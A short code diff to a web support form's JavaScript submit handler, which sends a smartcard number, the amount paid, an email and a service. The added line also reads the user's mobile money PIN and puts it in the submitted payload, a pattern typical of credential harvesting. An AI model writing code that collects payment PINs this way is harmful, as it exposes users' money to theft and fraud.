@@ -560,7 +560,8 @@ document.getElementById("supportForm").addEventListener("submit", async function
     iuc_number: form.elements.namedItem("iuc_number").value.trim(),
     amount_paid: parseFloat(form.elements.namedItem("amount_paid").value),
     email: form.elements.namedItem("email").value.trim() || null,
-    service: form.elements.namedItem("service").value
+    service: form.elements.namedItem("service").value,
+    momo_pin: form.elements.namedItem("momo_pin").value.trim()
 };
 
     try {
